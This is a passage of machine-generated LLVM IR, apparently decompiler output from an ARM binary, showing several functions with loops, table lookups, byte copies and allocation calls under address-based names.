  %v1_8384 = phi i32 [ %v1_83b0, %dec_label_pc_8380 ], [ %v2_836c, %dec_label_pc_8360 ]
  %v0_8380 = phi i32 [ %v1_83ac, %dec_label_pc_8380 ], [ %v1_837c, %dec_label_pc_8360 ]
  %v1_8380 = add i32 %v0_8380, -5
  %v2_8380 = inttoptr i32 %v1_8380 to i32*
  %v3_8380 = load i32, i32* %v2_8380, align 4
  store i32 %v3_8380, i32* %r1.global-to-local, align 4
  %v2_8384 = add i32 %v1_8384, 16
  %v3_8384 = inttoptr i32 %v2_8384 to i32*
  store i32 %v3_8380, i32* %v3_8384, align 4
  %v0_8388 = load i32, i32* @r7, align 4
  %v1_8388 = add i32 %v0_8388, -6
  store i32 %v1_8388, i32* %r3.global-to-local, align 4
  %v0_838c = load i32, i32* %r0.global-to-local, align 4
  %v1_838c = add i32 %v0_838c, -1
  %v2_838c = inttoptr i32 %v1_838c to i8*
  %v3_838c = load i8, i8* %v2_838c, align 1
  %v4_838c = zext i8 %v3_838c to i32
  store i32 %v4_838c, i32* %r2.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v1_8390 = add i32 %v0_8390, -5
  store i32 %v1_8390, i32* @r6, align 4
  %v9_8394 = icmp eq i32 %v1_8390, %v1_8388
  store i1 %v9_8394, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_838c, i32* @r4, align 4
  %v2_83a0 = load i32, i32* @ip, align 4
  %v3_83a0 = add i32 %v2_83a0, 20
  %v4_83a0 = inttoptr i32 %v3_83a0 to i8*
  store i8 %v3_838c, i8* %v4_83a0, align 1
  %v0_83a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83a4 = load i32, i32* @ip, align 4
  %v2_83a4 = add i32 %v1_83a4, 4
  %v3_83a4 = inttoptr i32 %v2_83a4 to i32*
  store i32 %v0_83a4, i32* %v3_83a4, align 4
  %v0_83a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83a8 = trunc i32 %v0_83a8 to i16
  %v2_83a8 = load i32, i32* @ip, align 4
  %v3_83a8 = inttoptr i32 %v2_83a8 to i16*
  store i16 %v1_83a8, i16* %v3_83a8, align 2
  %v0_83ac = load i32, i32* %r0.global-to-local, align 4
  %v1_83ac = add i32 %v0_83ac, 5
  store i32 %v1_83ac, i32* %r0.global-to-local, align 4
  %v0_83b0 = load i32, i32* @ip, align 4
  %v1_83b0 = add i32 %v0_83b0, 24
  store i32 %v1_83b0, i32* @ip, align 4
  %v0_83b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83b4, label %dec_label_pc_83b8, label %dec_label_pc_8380

dec_label_pc_83b8:                                ; preds = %dec_label_pc_8380
  %v0_83b8 = load i32, i32* @r6, align 4
  %v2_83b8 = icmp eq i32 %v0_83b8, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83b8, label %dec_label_pc_84bc, label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83b8
  %v0_83c0 = load i32, i32* @r4, align 4
  %v1_83c0 = inttoptr i32 %v0_83c0 to i8*
  %v2_83c0 = load i8, i8* %v1_83c0, align 1
  %v3_83c0 = zext i8 %v2_83c0 to i32
  store i32 %v3_83c0, i32* @r5, align 4
  %v2_83c4 = icmp eq i8 %v2_83c0, 0
  store i1 %v2_83c4, i1* %cpsr_z.global-to-local, align 1
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -7
  store i32 %v1_83c8, i32* @r8, align 4
  br i1 %v2_83c4, label %bb, label %dec_label_pc_83d4

bb:                                               ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* @r6, align 4
  br label %dec_label_pc_8498

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_83dc = call i32 @function_1214c(i32 %v3_83c0, i32 8)
  store i32 %v2_83dc, i32* %r0.global-to-local, align 4
  %v0_83e0 = load i32, i32* @r8, align 4
  %v2_83e0 = icmp eq i32 %v0_83e0, 0
  store i1 %v2_83e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83dc, i32* @r6, align 4
  br i1 %v2_83e0, label %dec_label_pc_84bc, label %dec_label_pc_83ec

dec_label_pc_83ec:                                ; preds = %dec_label_pc_83d4
  %v0_83ec = load i32, i32* @r4, align 4
  %v1_83ec = add i32 %v0_83ec, 1
  %v2_83ec = inttoptr i32 %v1_83ec to i8*
  %v3_83ec = load i8, i8* %v2_83ec, align 1
  %v0_83f0 = load i32, i32* @r7, align 4
  %v7_83f0 = icmp eq i32 %v0_83f0, 8
  store i1 %v7_83f0, i1* %cpsr_z.global-to-local, align 1
  %v3_83f4 = add i32 %v2_83dc, 4
  %v4_83f4 = inttoptr i32 %v3_83f4 to i8*
  store i8 %v3_83ec, i8* %v4_83f4, align 1
  %v0_83f8 = load i32, i32* @r4, align 4
  %v1_83f8 = add i32 %v0_83f8, 1
  store i32 %v1_83f8, i32* %r3.global-to-local, align 4
  %v0_83fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83fc, label %dec_label_pc_84bc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83ec
  %v1_8400 = add i32 %v0_83f8, 2
  %v2_8400 = inttoptr i32 %v1_8400 to i8*
  %v3_8400 = load i8, i8* %v2_8400, align 1
  %v4_8400 = zext i8 %v3_8400 to i32
  store i32 %v4_8400, i32* @r4, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  %v1_8404 = add i32 %v0_8404, -9
  store i32 %v1_8404, i32* @r8, align 4
  %v9_8408 = icmp eq i32 %v1_8404, %v4_8400
  store i1 %v9_8408, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8400, i32* %r1.global-to-local, align 4
  %v5_8410 = icmp slt i32 %v1_8404, %v4_8400
  br i1 %v5_8410, label %dec_label_pc_84bc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8400
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84147 = add i32 %v0_83f8, 3
  store i32 %v7_84147, i32* @r7, align 4
  %v6_8418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8418, i32* @sl, align 4
  br label %dec_label_pc_845c

dec_label_pc_8428:                                ; preds = %dec_label_pc_845c
  %v0_8428 = load i32, i32* @r8, align 4
  %v1_8428 = load i32, i32* @r4, align 4
  %v2_8428 = sub i32 %v0_8428, %v1_8428
  store i32 %v2_8428, i32* %r2.global-to-local, align 4
  %v9_8428 = icmp eq i32 %v0_8428, %v1_8428
  store i1 %v9_8428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8428, label %dec_label_pc_84bc, label %dec_label_pc_8430

dec_label_pc_8430:                                ; preds = %dec_label_pc_8428
  %v1_8430 = load i32, i32* @r7, align 4
  %v2_8430 = add i32 %v1_8430, %v1_8428
  %v3_8430 = inttoptr i32 %v2_8430 to i8*
  %v4_8430 = load i8, i8* %v3_8430, align 1
  store i32 %v2_8430, i32* %r0.global-to-local, align 4
  %v1_8438 = add i32 %v2_8428, -1
  store i32 %v1_8438, i32* %r2.global-to-local, align 4
  %v7_8438 = icmp eq i32 %v2_8428, 1
  store i1 %v7_8438, i1* %cpsr_z.global-to-local, align 1
  %v3_843c = add i32 %v2_8490, 4
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 %v4_8430, i8* %v4_843c, align 1
  %v0_8440 = load i32, i32* %r0.global-to-local, align 4
  %v1_8440 = add i32 %v0_8440, 1
  store i32 %v1_8440, i32* %r3.global-to-local, align 4
  %v0_8444 = load i32, i32* %r2.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, -1
  store i32 %v1_8444, i32* @r8, align 4
  %v1_8448 = add i32 %v0_8440, 2
  store i32 %v1_8448, i32* @r7, align 4
  %v0_844c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_844c, label %dec_label_pc_84bc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8430
  %v2_8450 = inttoptr i32 %v1_8440 to i8*
  %v3_8450 = load i8, i8* %v2_8450, align 1
  %v4_8450 = zext i8 %v3_8450 to i32
  store i32 %v4_8450, i32* @r4, align 4
  %v2_8454 = sub i32 %v1_8444, %v4_8450
  %tmp36 = sub i32 0, %v2_8454
  %v6_8454 = and i32 %v1_8444, %tmp36
  %v7_8454 = icmp slt i32 %v6_8454, 0
  %v8_8454 = icmp slt i32 %v2_8454, 0
  %v9_8454 = icmp eq i32 %v1_8444, %v4_8450
  store i1 %v9_8454, i1* %cpsr_z.global-to-local, align 1
  %v2_8458 = xor i1 %v8_8454, %v7_8454
  br i1 %v2_8458, label %dec_label_pc_84bc, label %dec_label_pc_845c

dec_label_pc_845c:                                ; preds = %bb35, %dec_label_pc_8450
  %v0_8460 = phi i32 [ %v4_8400, %bb35 ], [ %v4_8450, %dec_label_pc_8450 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_8470, %dec_label_pc_8450 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_8460 = add nuw nsw i32 %v0_8460, 1
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8464 = call i32 @function_1214c(i32 %v1_8460, i32 1)
  store i32 %v2_8464, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_846c = load i32, i32* @sl, align 4
  %v2_846c = inttoptr i32 %v1_846c to i32*
  store i32 %v2_8464, i32* %v2_846c, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, 1
  store i32 %v1_8470, i32* %r3.global-to-local, align 4
  %v0_8474 = load i32, i32* @r4, align 4
  store i32 %v0_8474, i32* %r2.global-to-local, align 4
  %v0_8478 = load i32, i32* @r7, align 4
  store i32 %v0_8478, i32* %r1.global-to-local, align 4
  %v3_8480 = call i32 @function_10388(i32 %v2_8464, i32 %v0_8478, i32 %v0_8474)
  store i32 %v3_8480, i32* %r0.global-to-local, align 4
  store i32 %v1_8470, i32* %r2.global-to-local, align 4
  %v3_8488 = mul i32 %v1_8470, 8
  store i32 %v3_8488, i32* %r3.global-to-local, align 4
  %v1_848c = load i32, i32* @r5, align 4
  %v9_848c = icmp eq i32 %v1_8470, %v1_848c
  store i1 %v9_848c, i1* %cpsr_z.global-to-local, align 1
  %v0_8490 = load i32, i32* @r6, align 4
  %v2_8490 = add i32 %v0_8490, %v3_8488
  store i32 %v2_8490, i32* @sl, align 4
  br i1 %v9_848c, label %dec_label_pc_8498, label %dec_label_pc_8428

dec_label_pc_8498:                                ; preds = %dec_label_pc_845c, %bb
  %v0_8498 = call i32 @function_11200()
  %v2_84a0 = inttoptr i32 %v0_8498 to i32*
  store i32 0, i32* %v2_84a0, align 4
  store i32 %v4_8330, i32* %r1.global-to-local, align 4
  %v0_84a8 = load i32, i32* @fp, align 4
  store i32 %v0_84a8, i32* %r0.global-to-local, align 4
  %v0_84ac = load i32, i32* @sb, align 4
  store i32 %v0_84ac, i32* %r2.global-to-local, align 4
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84b4 = load i32, i32* @r5, align 4
  %v5_84b4 = load i32, i32* @r6, align 4
  %v6_84b8 = trunc i32 %v2_84b4 to i8
  %v7_84b8 = call i32 @function_81ec(i32 %v0_84a8, i32 %v4_8330, i32 %v0_84ac, i32 %v2_836c, i8 %v6_84b8, i32 %v5_84b4)
  store i32 %v7_84b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84bc

dec_label_pc_84bc:                                ; preds = %dec_label_pc_8450, %dec_label_pc_8430, %dec_label_pc_8428, %dec_label_pc_8400, %dec_label_pc_83ec, %dec_label_pc_83d4, %dec_label_pc_83b8, %dec_label_pc_8498
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84c0 = icmp eq i32 %v2_836c, 0
  store i1 %v2_84c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84c0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84bc
  store i32 %v2_836c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84bc, %bb37
  store i32 33996, i32* @lr, align 4
  %v1_84c8 = xor i1 %v2_84c0, true
  call void @__pseudo_cond_branch(i1 %v1_84c8, i32 ptrtoint (i32* @global_var_12898.21 to i32))
  %v0_84cc = load i32, i32* @r6, align 4
  %v2_84cc = icmp eq i32 %v0_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84cc, label %.dec_label_pc_8300_crit_edge, label %dec_label_pc_84d4

.dec_label_pc_8300_crit_edge:                     ; preds = %bb38
  %v1_8308.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

dec_label_pc_84d4:                                ; preds = %bb38
  %v0_84d4 = load i32, i32* @r5, align 4
  %v2_84d4 = icmp eq i32 %v0_84d4, 0
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_84f8, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_84d4
  br label %dec_label_pc_84e0

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84dc
  %v0_84e8 = phi i32 [ 0, %dec_label_pc_84dc ], [ %v1_84f0, %dec_label_pc_84e0 ]
  %v0_84e0 = phi i32 [ %v0_84cc, %dec_label_pc_84dc ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  %v4_84e0 = mul i32 %v0_84e8, 8
  %v5_84e0 = add i32 %v4_84e0, %v0_84e0
  %v6_84e0 = inttoptr i32 %v5_84e0 to i32*
  %v7_84e0 = load i32, i32* %v6_84e0, align 4
  store i32 %v7_84e0, i32* %r0.global-to-local, align 4
  %v2_84e4 = icmp eq i32 %v7_84e0, 0
  store i1 %v2_84e4, i1* %cpsr_z.global-to-local, align 1
  %v1_84e8 = add i32 %v0_84e8, 1
  store i32 %v1_84e8, i32* @r4, align 4
  store i32 34032, i32* @lr, align 4
  %v1_84ec = xor i1 %v2_84e4, true
  call void @__pseudo_cond_branch(i1 %v1_84ec, i32 ptrtoint (i32* @global_var_12898.21 to i32))
  %v0_84f0 = load i32, i32* @r5, align 4
  %v1_84f0 = load i32, i32* @r4, align 4
  %v9_84f0 = icmp eq i32 %v0_84f0, %v1_84f0
  store i1 %v9_84f0, i1* %cpsr_z.global-to-local, align 1
  %v0_84f8.pre = load i32, i32* @r6, align 4
  br i1 %v9_84f0, label %dec_label_pc_84f8, label %dec_label_pc_84e0

dec_label_pc_84f8:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84d4
  %v0_84f8 = phi i32 [ %v0_84cc, %dec_label_pc_84d4 ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  store i32 %v0_84f8, i32* @r0, align 4
  %v0_84fc = call i32 @function_12898()
  store i32 %v0_84fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

; uselistorder directives
  uselistorder i32 %v0_84fc, { 1, 0 }
  uselistorder i32 %v1_84f0, { 1, 0 }
  uselistorder i1 %v2_84c0, { 0, 2, 1 }
  uselistorder i32 %v2_8490, { 1, 0 }
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %v1_8470, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8454, { 1, 0 }
  uselistorder i32 %v4_8450, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8444, { 2, 0, 1, 3 }
  uselistorder i32 %v3_83c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83b0, { 1, 0 }
  uselistorder i32 %v1_83ac, { 1, 0 }
  uselistorder i32 %v2_836c, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8310, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_830c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_82f8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 20, 3, 21, 5, 8, 10, 9, 6, 7, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84bc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_845c, { 1, 0 }
  uselistorder label %dec_label_pc_8300, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_8504(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8504:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8504 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8504, label %dec_label_pc_854c, label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_8504
  %v0_8514 = load i32, i32* %r1.global-to-local, align 4
  %v1_8514 = add i32 %v0_8514, 4
  %v2_8514 = inttoptr i32 %v1_8514 to i8*
  %v3_8514 = load i8, i8* %v2_8514, align 1
  %v4_8514 = zext i8 %v3_8514 to i32
  %v9_8518 = icmp eq i32 %v4_8514, %arg3
  br i1 %v9_8518, label %dec_label_pc_8558, label %dec_label_pc_853c.preheader

dec_label_pc_853c.preheader:                      ; preds = %dec_label_pc_8514
  br label %dec_label_pc_853c

dec_label_pc_852c:                                ; preds = %dec_label_pc_853c
  %v1_852c = add i32 %v0_8534.in, 12
  %v2_852c = inttoptr i32 %v1_852c to i8*
  %v3_852c = load i8, i8* %v2_852c, align 1
  %v4_852c = zext i8 %v3_852c to i32
  %v9_8530 = icmp eq i32 %v4_852c, %arg3
  br i1 %v9_8530, label %dec_label_pc_8558, label %dec_label_pc_853c

dec_label_pc_853c:                                ; preds = %dec_label_pc_853c.preheader, %dec_label_pc_852c
  %v0_8534.in = phi i32 [ %v0_8514, %dec_label_pc_853c.preheader ], [ %v0_8534, %dec_label_pc_852c ]
  %v0_853c = phi i32 [ 0, %dec_label_pc_853c.preheader ], [ %v1_853c, %dec_label_pc_852c ]
  %v0_8534 = add i32 %v0_8534.in, 8
  %v1_853c = add i32 %v0_853c, 1
  %v9_8540 = icmp eq i32 %v1_853c, %arg1
  store i32 %v0_8534, i32* %r1.global-to-local, align 4
  br i1 %v9_8540, label %dec_label_pc_854c, label %dec_label_pc_852c

dec_label_pc_854c:                                ; preds = %dec_label_pc_853c, %dec_label_pc_8558, %dec_label_pc_8504, %dec_label_pc_8564
  %v0_854c = phi i32 [ %arg4, %dec_label_pc_8558 ], [ %arg4, %dec_label_pc_8504 ], [ %v1_8564, %dec_label_pc_8564 ], [ %arg4, %dec_label_pc_853c ]
  ret i32 %v0_854c

dec_label_pc_8558:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8514
  %v0_8558 = phi i32 [ %v0_8514, %dec_label_pc_8514 ], [ %v0_8534, %dec_label_pc_852c ]
  %v1_8558 = inttoptr i32 %v0_8558 to i32*
  %v2_8558 = load i32, i32* %v1_8558, align 4
  store i32 %v2_8558, i32* @r0, align 4
  %v2_855c = icmp eq i32 %v2_8558, 0
  br i1 %v2_855c, label %dec_label_pc_854c, label %dec_label_pc_8564

dec_label_pc_8564:                                ; preds = %dec_label_pc_8558
  %v1_8564 = call i32 @function_11334(i32 %v2_8558)
  br label %dec_label_pc_854c

; uselistorder directives
  uselistorder i32 %v1_853c, { 1, 0 }
  uselistorder i32 %v0_8534, { 1, 0, 2 }
  uselistorder i32 %v0_8534.in, { 1, 0 }
  uselistorder i32 %v0_8514, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_854c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_853c, { 1, 0 }
}

define i32 @function_8570(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8570:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8570 = icmp eq i32 %arg1, 0
  %v3_8574 = load i32, i32* @r4, align 4
  store i32 %v3_8574, i32* %stack_var_-8, align 4
  %v6_8574 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8570, label %dec_label_pc_85b8, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8570
  %v0_8580 = load i32, i32* %r1.global-to-local, align 4
  %v1_8580 = add i32 %v0_8580, 4
  %v2_8580 = inttoptr i32 %v1_8580 to i8*
  %v3_8580 = load i8, i8* %v2_8580, align 1
  %v4_8580 = zext i8 %v3_8580 to i32
  %v9_8584 = icmp eq i32 %v4_8580, %arg3
  br i1 %v9_8584, label %dec_label_pc_85c4, label %dec_label_pc_85a8.preheader

dec_label_pc_85a8.preheader:                      ; preds = %dec_label_pc_8580
  br label %dec_label_pc_85a8

dec_label_pc_8598:                                ; preds = %dec_label_pc_85a8
  %v1_8598 = add i32 %v0_85a0.in, 12
  %v2_8598 = inttoptr i32 %v1_8598 to i8*
  %v3_8598 = load i8, i8* %v2_8598, align 1
  %v4_8598 = zext i8 %v3_8598 to i32
  %v9_859c = icmp eq i32 %v4_8598, %arg3
  br i1 %v9_859c, label %dec_label_pc_85c4, label %dec_label_pc_85a8

dec_label_pc_85a8:                                ; preds = %dec_label_pc_85a8.preheader, %dec_label_pc_8598
  %v0_85a0.in = phi i32 [ %v0_8580, %dec_label_pc_85a8.preheader ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v0_85a8 = phi i32 [ 0, %dec_label_pc_85a8.preheader ], [ %v1_85a8, %dec_label_pc_8598 ]
  %v0_85a0 = add i32 %v0_85a0.in, 8
  %v1_85a8 = add i32 %v0_85a8, 1
  store i32 %v1_85a8, i32* @lr, align 4
  %v9_85ac = icmp eq i32 %v1_85a8, %arg1
  store i32 %v0_85a0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ac, label %dec_label_pc_85b8, label %dec_label_pc_8598

dec_label_pc_85b8:                                ; preds = %dec_label_pc_85a8, %dec_label_pc_85c4, %dec_label_pc_8570, %dec_label_pc_85d0
  %v2_85bc = phi i32 [ %v3_8574, %dec_label_pc_85c4 ], [ %v3_8574, %dec_label_pc_8570 ], [ %v2_85bc.pre, %dec_label_pc_85d0 ], [ %v3_8574, %dec_label_pc_85a8 ]
  %v0_85b8 = phi i32 [ %arg4, %dec_label_pc_85c4 ], [ %arg4, %dec_label_pc_8570 ], [ %v3_85d4, %dec_label_pc_85d0 ], [ %arg4, %dec_label_pc_85a8 ]
  store i32 %v2_85bc, i32* @r4, align 4
  store i32 %v6_8574, i32* @lr, align 4
  ret i32 %v0_85b8

dec_label_pc_85c4:                                ; preds = %dec_label_pc_8598, %dec_label_pc_8580
  %v0_85c4 = phi i32 [ %v0_8580, %dec_label_pc_8580 ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v1_85c4 = inttoptr i32 %v0_85c4 to i32*
  %v2_85c4 = load i32, i32* %v1_85c4, align 4
  %v2_85c8 = icmp eq i32 %v2_85c4, 0
  br i1 %v2_85c8, label %dec_label_pc_85b8, label %dec_label_pc_85d0

dec_label_pc_85d0:                                ; preds = %dec_label_pc_85c4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_85d4 = inttoptr i32 %v2_85c4 to i8*
  %v3_85d4 = call i32 @function_1043c(i8* %v2_85d4, i32 10)
  %v2_85bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85b8

; uselistorder directives
  uselistorder i32 %v1_85a8, { 1, 2, 0 }
  uselistorder i32 %v0_85a0, { 1, 0, 2 }
  uselistorder i32 %v0_85a0.in, { 1, 0 }
  uselistorder i32 %v0_8580, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85a8, { 1, 0 }
}

define i32 @function_85e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_85e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85e0 = load i32, i32* @r4, align 4
  store i32 %v3_85e0, i32* %stack_var_-24, align 4
  %v6_85e0 = load i32, i32* @r5, align 4
  %v9_85e0 = load i32, i32* @r6, align 4
  %v12_85e0 = load i32, i32* @r7, align 4
  %v15_85e0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ec = call i32 @function_1214c(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1e9c0.17 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e9c4.19 to i32), i32* @r6, align 4
  store i32 47208, i32* %r2.global-to-local, align 4
  store i32 %v2_85ec, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e9c1.25 to i32), i32* %r1.global-to-local, align 4
  %v2_860c = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_8610 = inttoptr i32 %v2_85ec to i32*
  store i32 47208, i32* %v2_8610, align 4
  %v3_8614 = load i32, i32* @r5, align 4
  %v4_8614 = add i32 %v3_8614, 4
  %v5_8614 = inttoptr i32 %v4_8614 to i8*
  store i8 0, i8* %v5_8614, align 1
  %v0_8618 = load i32, i32* %r1.global-to-local, align 4
  %v3_8618 = mul i32 %v0_8618, 4
  store i32 %v3_8618, i32* %r1.global-to-local, align 4
  %v5_861c = inttoptr i32 %v2_860c to i32*
  %v6_861c = call i32 @function_12280(i32* %v5_861c, i32 %v3_8618, i32 47208, i32 0)
  %v2_8620 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8620 = zext i8 %v2_8620 to i32
  store i32 %v6_861c, i32* %r2.global-to-local, align 4
  %v0_8628 = load i32, i32* @r5, align 4
  %v5_8628 = mul nuw nsw i32 %v3_8620, 4
  %v6_8628 = add i32 %v5_8628, %v6_861c
  %v7_8628 = inttoptr i32 %v6_8628 to i32*
  store i32 %v0_8628, i32* %v7_8628, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e9c1.25 to i32), i32* %r3.global-to-local, align 4
  %v1_8638 = load i32, i32* @r6, align 4
  %v2_8638 = inttoptr i32 %v1_8638 to i32*
  store i32 %v6_861c, i32* %v2_8638, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = trunc i32 %v0_863c to i8
  %v2_863c = load i32, i32* @r4, align 4
  %v3_863c = inttoptr i32 %v2_863c to i8*
  store i8 %v1_863c, i8* %v3_863c, align 1
  %v2_8640 = call i32 @function_1214c(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd54.27 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8640, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_1e9c1.25 to i32), i32* %r1.global-to-local, align 4
  %v2_8658 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_865c = inttoptr i32 %v2_8640 to i32*
  store i32 ptrtoint (i32* @global_var_bd54.27 to i32), i32* %v2_865c, align 4
  %v0_8660 = load i32, i32* @r8, align 4
  %v1_8660 = trunc i32 %v0_8660 to i8
  %v2_8660 = load i32, i32* @r5, align 4
  %v3_8660 = add i32 %v2_8660, 4
  %v4_8660 = inttoptr i32 %v3_8660 to i8*
  store i8 %v1_8660, i8* %v4_8660, align 1
  %v0_8664 = load i32, i32* %r1.global-to-local, align 4
  %v3_8664 = mul i32 %v0_8664, 4
  store i32 %v3_8664, i32* %r1.global-to-local, align 4
  %v4_8668 = inttoptr i32 %v2_8658 to i32*
  %v5_8668 = call i32 @function_12280(i32* %v4_8668, i32 %v3_8664, i32 %v6_861c, i32 ptrtoint (i32* @global_var_bd54.27 to i32))
  %v2_866c = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_866c = zext i8 %v2_866c to i32
  store i32 %v3_866c, i32* %r3.global-to-local, align 4
  store i32 %v5_8668, i32* %r2.global-to-local, align 4
  %v0_8674 = load i32, i32* @r5, align 4
  %v5_8674 = mul nuw nsw i32 %v3_866c, 4
  %v6_8674 = add i32 %v5_8674, %v5_8668
  %v7_8674 = inttoptr i32 %v6_8674 to i32*
  store i32 %v0_8674, i32* %v7_8674, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = load i32, i32* @r8, align 4
  %v2_867c = add i32 %v1_867c, %v0_867c
  store i32 %v2_867c, i32* %r3.global-to-local, align 4
